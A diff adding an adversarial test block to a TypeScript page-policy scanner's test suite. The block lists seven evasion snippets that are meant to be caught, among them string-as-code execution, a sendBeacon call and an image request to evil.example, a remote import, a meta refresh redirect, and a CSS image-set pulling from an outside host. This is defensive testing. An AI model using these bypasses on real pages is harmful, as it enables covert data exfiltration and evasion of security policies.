@@ -134,3 +134,19 @@ describe("the checks themselves", () => {
     expect(scan("html", '<script type="module" crossorigin src="./assets/a.js"></script><link href="./assets/a.css">')).toEqual([]);
   });
 });
+
+// Adversary, slice S4 (TECHNICAL 18.2): code that breaks the page policy but passes the gate.
+describe("adversary S4: the policy scan", () => {
+  const misses: [Kind, string, string][] = [
+    ["js", 'Function("return fetch")()', "Function( without new: a string run as code, as eval"],
+    ["js", 'setTimeout("steal()", 0)', "setTimeout with a string: a string run as code"],
+    ["js", 'import"https://evil.example/m.js";', "a bare import of an outside script"],
+    ["js", 'navigator.sendBeacon("https://evil.example/c", d)', "sendBeacon to an outside site"],
+    ["js", 'new Image().src="https://evil.example/p.gif"', "an image from an outside site"],
+    ["html", '<meta http-equiv="refresh" content="0;url=https://evil.example/">', "a refresh to an outside site"],
+    ["css", 'a{background-image:image-set("https://evil.example/x.png" 1x)}', "image-set from an outside site"],
+  ];
+  for (const [kind, seed, what] of misses) {
+    it(`adv_S4_policy_scan_misses: ${what}`, () => { expect(scan(kind, seed)).not.toEqual([]); });
+  }
+});
